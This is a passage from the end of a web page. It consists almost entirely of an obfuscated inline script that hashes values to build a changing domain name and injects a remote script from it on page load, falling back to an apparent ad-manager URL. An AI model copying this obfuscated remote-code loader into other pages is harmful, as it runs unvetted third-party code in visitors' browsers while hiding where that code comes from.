90),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>